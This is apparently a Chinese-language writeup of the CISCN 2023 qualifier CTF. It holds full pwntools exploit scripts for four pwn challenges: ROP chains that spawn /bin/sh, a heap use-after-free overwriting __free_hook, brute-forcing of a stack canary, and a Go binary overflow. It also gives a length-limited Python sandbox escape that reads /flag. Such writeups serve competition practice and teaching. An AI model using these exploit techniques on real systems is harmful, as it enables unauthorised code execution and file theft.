---
comment: True
---

# CISCN 2023 Quals Writeup

!!! abstract
    第一次打国赛，misc 太烂了，于是做了两天 pwn，还挺好玩的。

---

## 烧烤摊儿
![](https://img.shields.io/badge/-PWN-4d3f3f?style=flat-square)

静态链接，没有 PIE。

main 函数中调用 menu，返回用户选项，然后通过函数地址偏移得到执行的函数 pijiu、chuan、yue、vip、gaiming 等。

gaiming 中 scanf 存在栈溢出，而改名需要买下摊子，花费 100000。

逆向 pijiu 发现输入的购买瓶数是 signed int，所以只要这里输入负数就可以增加钱。

买下摊子后通过 gaiming 中的栈溢出进行 ROP 即可，直接调用 syscall 执行 /bin/sh，/bin/sh 可以通过 gaiming 中的 strcpy 拷贝到 name 中。

???+ success "exp"
    ```python
    p.sendlineafter(b"> ", b"1")
    [p.recvline() for i in range(3)]
    p.sendline(b"1")
    p.sendlineafter(b"\n", b"-1000000")
    p.sendlineafter(b"> ", b"4")

    # gaiming stack
    """
    gaiming stack:
    00:0000│ rsp
    01:0008│ 
    02:0010│ 
    03:0018│ 
    04:0020│ rbp
    05:0028│ ret addr
    """

    """
    0x0000000000402404 : syscall
    0x000000000040264f : pop rdi ; ret
    0x0000000000458827 : pop rax ; ret
    0x000000000040a67e : pop rsi ; ret
    0x00000000004a404a : pop rax ; pop rdx ; pop rbx ; ret
    """

    # syscall(rdi: &"/bin/sh", rax: 59, rsi: 0, rdx: 0)
    payload = b"/bin/sh\x00"
    payload += b"AAAAAAAA"
    payload += b"AAAAAAAA"
    payload += b"AAAAAAAA"
    payload += b"AAAAAAAA" # fill stack
    payload += p64(0x40264f) # pop rdi ; ret
    payload += p64(0x4e60f0) # name
    payload += p64(0x4a404a) # pop rax ; pop rdx ; pop rbx ; ret
    payload += p64(59)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0x40a67e) # pop rsi ; ret
    payload += p64(0)
    payload += p64(0x402404) # syscall

    p.sendlineafter(b"> ", b"5")
    p.sendlineafter(b"\n", payload)

    p.interactive()
    ```

---

## StrangeTalkBot
![](https://img.shields.io/badge/-PWN-4d3f3f?style=flat-square)

逆向程序可以发现一些 BINARYBF-c.c 之类的，配合 assert 搜索可以知道是使用了 protobuf，main 函数中调用的 sub_192D 函数就是进行 protobuf 消息的解析，然后将得到的 v4[4:9] 传入了 sub_155D 进行分类处理，这部分参数就是用户输入的 protobuf message 结构。

通过 sub_155D 可以知道一共有四种操作，对一系列堆进行操作，第一个参数 int64 就是选择操作。栈上保存一个 base_addr 记录多个 malloc 分配的地址，传入的第二个参数是堆的索引。第三和第四个参数和起来是一个 bytes 序列（第三个参数是这个序列的长度）所以交互需要的 protobuf 结构：

```protobuf
syntax = "proto3";

message Msg {
    int64 id = 1;
    int64 idx = 2;
    int64 size = 3;
    bytes buf = 4;
}
```

一些限制：只能创建 0x20 个堆，堆的大小/bytes 序列长度不能超过 0xf0。

四个操作：

- 1 - create：如果 base+i 处没有记录分配的地址，则新 malloc 一个，大小为 size 和 buf 长度的最大值，然后将 buf 中内容拷贝过去
- 2 - update：更新 base+i 指向的堆的内容，拷贝 buf 内容过去（长度超过原大小会截断）
- 3 - print：将 base+i 指向的堆的内容全部输出到 stdout
- 4 - delete：free 掉 base+i 指向的堆，但不清空 base+i 处记录的指针

由于 free 的时候指针仍留着，所以存在 UAF。思路：

- 先通过额外七个堆绕过 tcache，接着 free 一个堆到 unordered bin，从而通过 fd bk leak 得到 libc 基址
- 然后利用 UAF 修改 tcache bin 中的 fd 使得重新 malloc 回来的地址变为 __free_hook
- 最后在 __free_hook 的地方迁移栈并 ROP 对 flag 进行 open read write 即可

???+ success "exp"
    ```python
    from exp_pb2 import *

    ...

    def send(_id, idx, size, buf):
        msg = Msg()
        msg.id = _id << 1
        msg.idx = idx << 1
        msg.size = size << 1
        msg.buf = buf
        return msg.SerializeToString()

    def create(idx, size, content):
        p.sendafter(b": \n", send(1, idx, size, content))

    def update(idx, content):
        p.sendafter(b": \n", send(2, idx, 0xf0, content))

    def print_(idx):
        p.sendafter(b": \n", send(3, idx, 3, b"AAA"))

    def delete(idx):
        p.sendafter(b": \n", send(4, idx, 3, b"AAA"))

    for i in range(1, 9):
        create(i, 0x80, b"AAA")
    pause()

    for i in range(8, 0, -1):
        delete(i)
    pause()

    print_(1)
    p.recvn(0x70)
    libc.address = u64(p.recvn(0x8)) - 0x1ECBE0

    create(10, 0xf0, b"AAA")
    create(11, 0xf0, b"AAA")
    delete(11)
    delete(10)
    update(10, p64(libc.sym['__free_hook']))
    create(12, 0xf0, p64(0) + p64(libc.sym['__free_hook'] + 0x10))
    create(13, 0xf0, b"a")

    """
    0x0000000000047445 : add rsp, 0x28 ; ret
    0x000000000005b4d0 : mov rsp, rdx ; ret
    0x0000000000023b6a : pop rdi ; ret
    0x000000000002601f : pop rsi ; ret
    0x0000000000142c92 : pop rdx ; ret
    0x0000000000151990 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]
    """

    add_rsp_ret = libc.address + 0x47445
    mov_rsp_rdx_ret = libc.address + 0x5b4d0
    pop_rdi_ret = libc.address + 0x23b6a
    pop_rsi_ret = libc.address + 0x2601f
    pop_rdx_ret = libc.address + 0x142c92
    gadget = libc.address + 0x151990

    payload  = p64(gadget)
    payload += p64(libc.sym["__free_hook"] + 0x10)
    payload += p64(add_rsp_ret)
    payload += p64(0)
    payload += p64(0)
    payload += p64(0)
    payload += p64(mov_rsp_rdx_ret)
    payload += p64(0)
    payload += p64(pop_rdi_ret)
    payload += p64(libc.sym["__free_hook"] + 0xc0)
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(libc.sym["open"])
    payload += p64(pop_rdi_ret)
    payload += p64(3)
    payload += p64(pop_rsi_ret)
    payload += p64(libc.sym["__free_hook"] - 0x100)
    payload += p64(pop_rdx_ret)
    payload += p64(0x100)
    payload += p64(libc.sym["read"])
    payload += p64(pop_rdi_ret)
    payload += p64(libc.sym["__free_hook"] - 0x100)
    payload += p64(libc.sym["puts"])
    payload += p64(0)
    payload += b"./flag\x00"

    update(13, payload)
    delete(12)

    p.interactive()
    ```

---

## funcanary
![](https://img.shields.io/badge/-PWN-4d3f3f?style=flat-square)

一个不断 fork 的程序，因为 fork 创建子进程时拷贝全部内存，所以 canary 不会变，函数地址也都不会变。

所以逐字节爆破 canary，然后爆破覆盖返回地址末尾，直到正确跑到后门地址为止：

???+ success "exp"
    ```python
    canary = b"\x00"

    p.recv()

    for i in range(7):
        for j in range(256):
            payload = b"A" * 0x68 + canary + p8(j)
            p.send(payload)
            p.recvline()
            res = p.recvline()
            if b"stack smashing" not in res:
                info(f"canary[{i}] = {hex(j)}")
                canary += p8(j)
                break
        assert(len(canary) == i + 2)

    success(f"canary = {canary}")

    context.log_level = "debug"

    for j in range(0x100):
        payload = b"A" * 0x68 + canary + b"A" * 8 + p8(0x2E) + p8(j)
        p.send(payload)
        res = p.recv()
        if b"flag" in res:
            print(res)
            break
    ```

---

## Shell We Go

go 逆向，通过搜索关键字符串，知道函数 sub_4C1900 处为处理命令的函数，其中跟着 cert 命令可以知道接下来需要输入 nAcDsMicN 然后剩余内容在 sub_4C14A0 函数中进行判断。

根据 IDA finger 的解析，这个函数中先对输入进行了 rc4 加密，密钥为 F1nallB1rd3K3y，然后对结果 Base64 后与 JLIX8pbSvYZu/WaG 比较，返回来即可得到 cert 认证的内容 `S33UAga1n@#!`

接下来就可以进行 shell 操作，ls 直接调用 os，cd 直接调用 os.chdir，cat 禁止，cat flag 输出假 flag，whoami 直接输出 nightingale，exit 退出，只有 echo 先输入后输出，测试得知会存在栈溢。而且根据逆向，需要先用 0x200 个 + 填满 buffer，下一个参数中再进行返回地址的覆盖。

调试得知可以进行返回地址的覆盖，所以进行 ROP 即可，因为 flag 字符串在程序中多次出现，所以 open read write 即可。

???+ success "exp"
    ```python
    p.sendlineafter(b"$ ", b"cert nAcDsMicN S33UAga1n@#!")
    # p.interactive()

    """
    0x000000000040d9e6 : pop rax ; ret
    0x0000000000444fec : pop rdi ; ret
    0x000000000041e818 : pop rsi ; ret
    0x000000000049e11d : pop rdx ; ret
    0x000000000040328c : syscall
    """

    pop_rax_ret = 0x40d9e6
    pop_rdi_ret = 0x444fec
    pop_rsi_ret = 0x41e818
    pop_rdx_ret = 0x49e11d
    syscall = 0x40328c
    syscall_ret = 0x4636e9
    flag_str = 0x4c34c8
    data_buf = 0x59be00

    payload = b"echo " + b"+" * 0x200 + b" " + b"a" * 4

    payload += p64(pop_rax_ret)
    payload += p64(2)
    payload += p64(pop_rdi_ret)
    payload += p64(flag_str)
    payload += p64(pop_rsi_ret)
    payload += p64(0)
    payload += p64(syscall_ret)

    payload += p64(pop_rax_ret)
    payload += p64(0)
    payload += p64(pop_rdi_ret)
    payload += p64(3)
    payload += p64(pop_rsi_ret)
    payload += p64(data_buf)
    payload += p64(pop_rdx_ret)
    payload += p64(0x100)
    payload += p64(syscall_ret)

    payload += p64(pop_rax_ret)
    payload += p64(1)
    payload += p64(pop_rdi_ret)
    payload += p64(1)
    payload += p64(pop_rsi_ret)
    payload += p64(data_buf)
    payload += p64(pop_rdx_ret)
    payload += p64(0x100)
    payload += p64(syscall_ret)

    payload += b"A" * 16 + b"A" * (0x100 - 23 * 8)

    info(payload)

    # payload += b"A" * 0x40

    p.sendlineafter(b"# ", payload)
    p.interactive()
    ```

---

## 被加密的生产流量
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

modbus TCP 流量，直接 wireshark 追踪 TCP 流，可以发现前一部分客户端流量每次末尾都有两个可见字符，拼到一起：

MMYWMX3GNEYWOXZRGAYDA===

Base32 编码，解码得到 c1f_fi1g_1000，包上 flag{} 即 flag。

--- 

## pyshell
![](https://img.shields.io/badge/-MISC-informational?style=flat-square)

通过尝试得知沙箱限制的是每次输入的长度。

所以使用 python shell 每次结果作为 _ 变量的值的特性进行拼接以及 eval 即可：

```python
'open('
_+'"/f'
_+'lag'
_+'").'
_+'rea'
_+'d()'
eval(_)
```